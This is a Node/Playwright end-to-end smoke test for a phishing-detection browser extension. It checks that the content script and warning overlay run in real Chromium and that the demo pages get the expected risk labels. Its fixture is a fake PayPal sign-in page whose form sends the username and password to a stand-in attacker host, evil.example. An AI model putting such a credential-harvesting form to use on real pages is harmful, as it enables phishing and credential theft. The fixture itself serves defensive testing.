// End-to-end smoke test: load the *built* extension in a real Chromium and prove
// the content script and warning overlay actually execute there.
//
// This exists because the unit suite (vitest) mocks the module graph and never
// loads the bundle in a browser, so it once stayed fully green while an ES
// `import` shipped in a classic (non-module) content script broke the extension
// in real Chrome with "Could not establish connection" (see README > Lessons
// Learned, and the two-pass Rollup build in vite.config.ts). A syntax error or
// wrong module format in dist/content/dom-analyzer.js or dist/warning/overlay.js
// stops the round-trips below and fails this test.
//
// Run: npm run build && node e2e/smoke.mjs  (CI wraps it in xvfb-run).
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { chromium } from "playwright";

const here = dirname(fileURLToPath(import.meta.url));
const distPath = resolve(here, "..", "dist");
const demoPagesPath = resolve(here, "..", "..", "demo", "pages");

// The toolbar badge the service worker sets from the local score, per label.
const BADGE_BY_LABEL = { safe: "", suspicious: "?", dangerous: "!" };
// Each local demo page is meant to show one label; nothing else checks that the
// pages still do after scoring changes (suspicious.html once drifted to Safe 15).
const DEMO_PAGES = [
  { file: "safe.html", label: "safe" },
  { file: "suspicious.html", label: "suspicious" },
  { file: "phishlens-demo-dangerous-login-secure-update.html", label: "dangerous" },
];
// MV3 extensions (their service worker) don't register under Chromium's legacy
// headless mode, but the newer `--headless=new` mode loads them fully. Using it
// lets this run in CI without an X server (xvfb). PW_HEADED=1 forces a visible
// window for local debugging.
const useNewHeadless = !process.env.PW_HEADED;

// Copy the built extension to a temp dir and grant a loopback host permission so
// the test can exercise chrome.scripting.executeScript (the overlay injection),
// which in production is gated behind the popup's activeTab user gesture. This
// patched copy is test-only and never committed; the shipped manifest keeps its
// minimal activeTab/scripting/storage permission set.
function stageExtensionWithHostPermission() {
  const staged = mkdtempSync(join(tmpdir(), "phishlens-ext-"));
  cpSync(distPath, staged, { recursive: true });
  const manifestPath = join(staged, "manifest.json");
  const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
  manifest.host_permissions = [...(manifest.host_permissions ?? []), "http://127.0.0.1/*"];
  writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
  return staged;
}

const FIXTURE_HTML = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>PayPal account verification</title>
    <link rel="icon" href="https://paypal.com/favicon.ico" />
  </head>
  <body>
    <h1>Sign in</h1>
    <form action="https://evil.example/collect" method="post">
      <input type="text" name="user" />
      <input type="password" name="pass" />
      <input type="hidden" name="csrf" value="x" />
      <button type="submit">Log in</button>
    </form>
  </body>
</html>`;

async function main() {
  assert.ok(existsSync(join(distPath, "manifest.json")), `built extension not found at ${distPath} — run "npm run build" first`);

  const demoFiles = new Set(DEMO_PAGES.map((demoPage) => demoPage.file));
  const server = createServer((req, res) => {
    // /pages/<file> serves the committed demo pages, like demo/serve_demo.py.
    const demoFile = req.url?.startsWith("/pages/") ? req.url.slice("/pages/".length) : null;
    res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
    res.end(demoFile && demoFiles.has(demoFile) ? readFileSync(join(demoPagesPath, demoFile)) : FIXTURE_HTML);
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const { port } = server.address();
  const fixtureUrl = `http://127.0.0.1:${port}/`;

  const extensionDir = stageExtensionWithHostPermission();
  const userDataDir = mkdtempSync(join(tmpdir(), "phishlens-e2e-"));
  const context = await chromium.launchPersistentContext(userDataDir, {
    headless: false,
    args: [
      ...(useNewHeadless ? ["--headless=new"] : []),
      `--disable-extensions-except=${extensionDir}`,
      `--load-extension=${extensionDir}`,
    ],
  });

  try {
    // The MV3 service worker registers on first load; wait for it so we can drive
    // the extension APIs (chrome.tabs / chrome.scripting) from its context.
    let [worker] = context.serviceWorkers();
    worker ??= await context.waitForEvent("serviceworker", { timeout: 15000 });

    const page = await context.newPage();
    await page.goto(fixtureUrl, { waitUntil: "load" });
    await page.bringToFront();
    await page.waitForTimeout(500); // let document_idle content-script injection settle

    // The extension only requests activeTab/scripting/storage — not "tabs" — so
    // chrome.tabs.query redacts tab.url. The tab.id is still readable, so we
    // target the focused fixture tab by active state rather than by URL (this
    // mirrors the real activeTab flow the popup uses).
    const activeTabId = await worker.evaluate(async () => {
      const [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
      return tab?.id ?? null;
    });
    assert.ok(activeTabId != null, "could not resolve the active fixture tab id");

    // 1) The content script must respond to PHISHLENS_COLLECT_DOM and report the
    //    DOM features it collected — proof it loaded and ran as a classic script.
    const collected = await worker.evaluate(
      (tabId) => chrome.tabs.sendMessage(tabId, { type: "PHISHLENS_COLLECT_DOM" }),
      activeTabId,
    );

    assert.ok(collected?.ok, `content script did not answer PHISHLENS_COLLECT_DOM: ${JSON.stringify(collected)}`);
    assert.equal(collected.dom_features.has_password_field, true, "expected the password field to be detected");
    assert.equal(collected.dom_features.external_form_action, true, "expected the external form action to be detected");
    assert.equal(collected.dom_features.favicon_hotlinked_brand, true, "expected the hotlinked brand favicon to be detected");

    // 2) The warning overlay (a separately-bundled IIFE injected via
    //    chrome.scripting.executeScript) must load and render its dialog.
    await worker.evaluate(async (tabId) => {
      await chrome.scripting.executeScript({ target: { tabId }, files: ["warning/overlay.js"] });
      await chrome.tabs.sendMessage(tabId, {
        type: "PHISHLENS_SHOW_WARNING",
        riskScore: 88,
        reasons: ["Smoke-test reason"],
      });
    }, activeTabId);

    await page.waitForSelector("#phishlens-warning-overlay", { timeout: 5000 });
    const overlayText = await page.textContent("#phishlens-warning-overlay");
    assert.ok(overlayText?.includes("Smoke-test reason"), "overlay did not render the provided reason");

    // 3) Each demo page must get the label it exists to demonstrate. The badge is
    //    the local score from real DOM collection in this browser, so this covers
    //    the page markup, the content script, and the scorer together. Served on
    //    localhost, not 127.0.0.1: an IP host adds URL risk points the real demo
    //    (localhost:8080) does not have.
    for (const demoPage of DEMO_PAGES) {
      const demoTab = await context.newPage();
      await demoTab.goto(`http://localhost:${port}/pages/${demoPage.file}`, { waitUntil: "load" });
      await demoTab.bringToFront();
      const expectedBadge = BADGE_BY_LABEL[demoPage.label];
      const badge = await worker.evaluate(async (expected) => {
        const [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
        let text = null;
        for (let attempt = 0; attempt < 50; attempt += 1) {
          text = await chrome.action.getBadgeText({ tabId: tab.id });
          if (text === expected && attempt >= 5) break; // "" is also the pre-analysis default
          await new Promise((r) => setTimeout(r, 100));
        }
        return text;
      }, expectedBadge);
      assert.equal(badge, expectedBadge, `${demoPage.file} should be ${demoPage.label} (badge "${expectedBadge}"), got "${badge}"`);
      await demoTab.close();
    }

    console.log("E2E smoke passed: content script, warning overlay, and demo page labels in real Chromium.");
  } finally {
    await context.close();
    server.close();
    rmSync(userDataDir, { recursive: true, force: true });
    rmSync(extensionDir, { recursive: true, force: true });
  }
}

main().catch((error) => {
  console.error("E2E smoke FAILED:", error);
  process.exit(1);
});
